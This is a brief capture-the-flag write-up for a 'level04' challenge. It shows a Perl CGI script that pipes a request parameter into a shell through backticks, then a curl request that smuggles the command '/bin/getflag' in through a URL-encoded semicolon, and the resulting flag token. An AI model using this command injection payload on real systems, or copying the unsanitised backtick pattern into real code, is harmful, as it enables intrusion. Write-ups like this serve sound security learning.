##### 1 - Analyze file
``cat level04.pl``
>#!/usr/bin/perl
>\#localhost:4747
>use CGI qw{param};
>print "Content-type: text/html\n\n";
>sub x {
>  $y = $_[0];
>  print `echo $y 2>&1`;
>}
>x(param("x"));

----

##### 2 - Getting the flag

%3B is the URL encoded version of ;, which is a command separator in bash.
So we can execute multiple commands in the same line.

``curl "http://localhost:4747?x=%3B/bin/getflag"``

>Check flag.Here is your token : **ne2searoevaevoem4ov4ar8ap**
